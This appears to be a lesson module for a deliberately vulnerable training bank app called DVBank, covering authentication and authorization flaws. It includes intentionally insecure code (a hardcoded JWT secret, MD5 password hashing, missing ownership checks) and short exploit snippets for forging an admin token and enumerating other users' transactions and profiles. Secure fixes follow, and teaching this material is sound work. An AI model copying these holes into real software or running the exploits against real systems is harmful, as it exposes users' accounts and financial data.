# Module 3: Authentication & Authorization Vulnerabilities

## Understanding Authentication & Authorization
Authentication and authorization are fundamental security concepts in web applications. While often confused, they serve distinct but complementary purposes in protecting user data and system resources. This module explores common vulnerabilities in both mechanisms and teaches you how to identify and fix them.

### What is Authentication?
Authentication is the process of verifying who someone is. Think of it like checking ID at a bank:
- The bank needs to verify you are who you claim to be
- You provide proof of identity (ID card, passport)
- The bank validates your proof against their records

In web applications, authentication typically involves:
1. **Something you know** (password, PIN) - The most common form of authentication
2. **Something you have** (phone, security key) - Used in multi-factor authentication
3. **Something you are** (fingerprint, face) - Biometric authentication methods

### What is Authorization?
Authorization determines what authenticated users are allowed to do within the system. Using the bank analogy:
- Regular customers can view their accounts and make transfers
- Bank tellers can process transactions for any customer
- Managers can approve large transactions
- Security guards can't access any accounts

This hierarchical access control ensures users can only perform actions appropriate to their role.

### Common Authentication Vulnerabilities
Understanding common authentication vulnerabilities is crucial for securing web applications. Here are key areas to watch for:

1. **Weak Password Policies**
   - Short passwords that are easily guessed
   - Common passwords from known password lists
   - No complexity requirements for stronger passwords
   - Missing rate limiting, allowing brute force attacks

2. **Token Vulnerabilities**
   - Weak secrets used for token generation
   - Missing token expiration mechanisms
   - Insecure token storage practices
   - Token reuse vulnerabilities

3. **Session Management Issues**
   - Sessions that never expire
   - Insecure session storage methods
   - Missing session invalidation on logout
   - Session fixation vulnerabilities

### Common Authorization Vulnerabilities
Authorization vulnerabilities can lead to unauthorized access and privilege escalation. Watch for these issues:

1. **Missing Access Controls**
   - Endpoints without proper role checks
   - Missing ownership validation on resources
   - Insecure direct object references (IDOR)

2. **Privilege Escalation**
   - Vertical escalation (user → admin)
   - Horizontal escalation (user → another user)
   - Role manipulation through parameter tampering

## DVBank Authentication Vulnerabilities
Let's examine real authentication vulnerabilities present in the DVBank application. Understanding these issues helps identify similar problems in other applications.

### 1. JWT Implementation Issues
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable JWT implementation
token = jwt.encode(
    {'user_id': user.id},
    'secret',  # Hardcoded secret
    algorithm='HS256'  # Weak algorithm
)

# Missing:
# - Token expiration
# - Algorithm enforcement
# - Secret key rotation
```

**Impact**:
- Tokens can be forged using known secret
- Tokens never expire, remaining valid indefinitely
- Algorithm confusion attacks possible through header manipulation

**Exploitation**:
```python
import jwt

# Create forged token
forged_token = jwt.encode(
    {'user_id': 1},  # Admin user ID
    'secret',
    algorithm='HS256'
)

# Use in requests
headers = {'Authorization': f'Bearer {forged_token}'}
response = requests.get('/api/admin', headers=headers)
```

### 2. Password Storage
**Location**: `backend/routes/auth_routes.py`
```python
# Weak password hashing
password_hash = hashlib.md5(password.encode()).hexdigest()

# Missing:
# - Strong hashing algorithm
# - Password salt
# - Pepper
# - Iteration count
```

**Impact**:
- Fast password cracking possible due to weak hashing
- No protection against rainbow table attacks
- No protection against brute force attempts

**Exploitation**:
```python
import hashlib
import requests

# Create MD5 hash
password = "password123"
hash = hashlib.md5(password.encode()).hexdigest()

# Register account with known hash
response = requests.post('/api/register', json={
    'username': 'test',
    'password_hash': hash
})
```

## DVBank Authorization Vulnerabilities
The application contains several authorization vulnerabilities that could allow unauthorized access to sensitive data and operations.

### 1. Missing Ownership Checks
**Location**: `backend/routes/transaction_routes.py`
```python
@app.route('/api/transactions/<transaction_id>')
@login_required
def get_transaction(transaction_id):
    # No ownership validation
    transaction = Transaction.query.get(transaction_id)
    return jsonify(transaction.to_dict())
```

**Impact**:
- Any authenticated user can access any transaction
- Financial privacy breach through unauthorized access
- Sensitive transaction data exposure

**Exploitation**:
```python
# Iterate through transaction IDs
for tid in range(1, 100):
    response = requests.get(f'/api/transactions/{tid}')
    if response.status_code == 200:
        print(f"Found transaction: {response.json()}")
```

### 2. Profile Access Control
**Location**: `backend/routes/auth_routes.py`
```python
@app.route('/api/profile/<user_id>')
@login_required
def get_profile(user_id):
    # No authorization check
    user = User.query.get(user_id)
    return jsonify(user.get_profile())
```

**Impact**:
- Profile information disclosure to unauthorized users
- Personal data exposure through IDOR
- Privacy violation of user data

**Exploitation**:
```python
# Access any user's profile
for uid in range(1, 100):
    response = requests.get(f'/api/profile/{uid}')
    if response.status_code == 200:
        print(f"Found profile: {response.json()}")
```

## Prevention Methods
Understanding how to properly implement authentication and authorization is crucial. Here are secure implementation examples:

### 1. Secure JWT Implementation
```python
# Strong JWT configuration
jwt_config = {
    'secret': os.getenv('JWT_SECRET'),
    'algorithm': 'HS512',
    'expires_in': 3600,  # 1 hour
    'required_claims': ['exp', 'iat', 'sub']
}

def create_token(user):
    return jwt.encode({
        'user_id': user.id,
        'exp': datetime.utcnow() + timedelta(seconds=jwt_config['expires_in']),
        'iat': datetime.utcnow(),
        'sub': str(user.id)
    }, jwt_config['secret'], algorithm=jwt_config['algorithm'])
```

### 2. Secure Password Storage
```python
from argon2 import PasswordHasher

ph = PasswordHasher()

def hash_password(password):
    return ph.hash(password)

def verify_password(hash, password):
    try:
        return ph.verify(hash, password)
    except:
        return False
```

### 3. Proper Authorization
```python
def verify_resource_owner(resource_id, user_id):
    resource = Resource.query.get(resource_id)
    if not resource or resource.user_id != user_id:
        raise Unauthorized("Access denied")
    return resource

@app.route('/api/transactions/<transaction_id>')
@login_required
def get_transaction(transaction_id):
    transaction = verify_resource_owner(transaction_id, current_user.id)
    return jsonify(transaction.to_dict())
```

## Practice Exercises
These exercises will help you understand and identify authentication and authorization vulnerabilities:

1. **JWT Analysis**
   - Decode and analyze JWT structure
   - Attempt token forgery
   - Implement secure JWT handling

2. **Password Security**
   - Analyze password hashing implementation
   - Implement secure password storage
   - Add password complexity rules
   - Exploit missing authorization in password reset endpoint
   - Use account takeover via unauthorized password changes

3. **Authorization Controls**
   - Add ownership validation to endpoints
   - Implement role-based access control
   - Add comprehensive audit logging

## Additional Resources
To deepen your understanding of authentication and authorization security:

1. [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
2. [OWASP Authentication Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
3. [OWASP Authorization Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
4. [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
5. [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
6. [Flask-JWT-Extended Documentation](https://flask-jwt-extended.readthedocs.io/en/stable/)
7. [Argon2 Password Hashing](https://argon2-cffi.readthedocs.io/en/stable/)
8. [OWASP Session Management Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
9. [OWASP Access Control Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
10. [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
11. [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)

### Related Tools
1. [JWT.io](https://jwt.io/) - For JWT token analysis and debugging
2. [Burp Suite JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) - For JWT testing
3. [SQLMap](https://github.com/sqlmapproject/sqlmap) - For testing authentication bypass via SQL injection
4. [Hydra](https://github.com/vanhauser-thc/thc-hydra) - For password brute force testing

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 
